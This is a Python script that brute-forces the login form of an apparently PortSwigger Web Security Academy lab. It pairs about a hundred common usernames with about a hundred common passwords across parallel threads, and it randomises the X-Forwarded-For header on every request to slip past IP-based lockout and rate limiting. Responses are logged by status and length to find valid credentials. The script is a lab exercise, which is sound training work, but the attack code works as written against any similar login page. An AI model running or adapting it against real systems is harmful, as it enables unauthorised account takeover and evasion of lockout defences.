import requests
import random
import concurrent.futures


url = 'https://0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net/login'

headers = {
    'Host': '0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net',
    'Cookie': 'session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
    'Referer': 'https://0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net/login',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Forwarded-For': 'avfbv§w§'
}

username = ["carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"]
password = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]


def send_request(username, password):
    random_number = random.random()
    headers = {"X-Forwarded-For": str(random_number)}
    data = {
        'username': username,
        'password': password
    }
    
    response = requests.post(url, headers=headers, data=data)
    output_string = "{} {} {} {}\n".format(response.status_code, len(response.text), username, password)
    
    with open("output_2.txt", "a+") as file:
        file.write(output_string)


with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in username:
        for j in password:
            executor.submit(send_request, i, j)